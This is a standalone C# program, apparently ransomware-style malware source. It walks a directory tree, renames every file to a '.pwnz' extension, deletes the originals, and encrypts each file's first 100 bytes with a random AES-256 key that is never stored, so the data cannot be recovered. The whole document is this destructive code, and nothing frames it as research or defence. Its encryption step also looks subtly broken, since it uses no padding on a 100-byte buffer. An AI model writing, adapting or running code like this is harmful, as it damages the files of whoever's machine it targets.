using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("Usage: Program <directory>");
            return;
        }

        string rootDirectory = args[0];
        if (!Directory.Exists(rootDirectory))
        {
            Console.WriteLine($"Directory '{rootDirectory}' does not exist.");
            return;
        }

        ProcessDirectory(rootDirectory);
    }

    static void ProcessDirectory(string targetDirectory)
    {
        // Process the list of files in the directory.
        string[] fileEntries = Directory.GetFiles(targetDirectory);
        foreach (string fileName in fileEntries)
        {
            ProcessFile(fileName);
        }

        // Recurse into subdirectories of this directory.
        string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
        foreach (string subdirectory in subdirectoryEntries)
        {
            ProcessDirectory(subdirectory);
        }
    }

    static void ProcessFile(string filePath)
    {
        try
        {
            string newFilePath = GetUniqueFilePath(filePath);

            // Copy the file with the new extension
            File.Copy(filePath, newFilePath);

            // Delete the original file
            File.Delete(filePath);

            // Encrypt the first 100 bytes of the new file
            EncryptFirst100Bytes(newFilePath);

            Console.WriteLine($"Processed file: {filePath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error processing file '{filePath}': {ex.Message}");
        }
    }

    static string GetUniqueFilePath(string filePath)
    {
        string directory = Path.GetDirectoryName(filePath);
        string originalFileName = Path.GetFileNameWithoutExtension(filePath);
        string newFilePath = Path.Combine(directory, originalFileName + ".pwnz");

        while (File.Exists(newFilePath))
        {
            char randomLetter = (char)('A' + new Random().Next(0, 26));
            newFilePath = Path.Combine(directory, originalFileName + randomLetter + ".pwnz");
        }

        return newFilePath;
    }

    static void EncryptFirst100Bytes(string filePath)
    {
        byte[] key = new byte[32]; // AES256 key size is 32 bytes
        byte[] iv = new byte[16]; // AES block size is 16 bytes

        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(key);
            rng.GetBytes(iv);
        }

        byte[] buffer = new byte[100];
        using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
        {
            fs.Read(buffer, 0, buffer.Length);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Padding = PaddingMode.None;
                aes.Mode = CipherMode.CBC;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(buffer, 0, buffer.Length);
                    }

                    byte[] encrypted = ms.ToArray();
                    fs.Seek(0, SeekOrigin.Begin);
                    fs.Write(encrypted, 0, encrypted.Length);
                }
            }
        }

        // Optionally, you can store the key and IV somewhere secure
        Console.WriteLine($"File '{filePath}' encrypted with AES256 key.");
    }
}
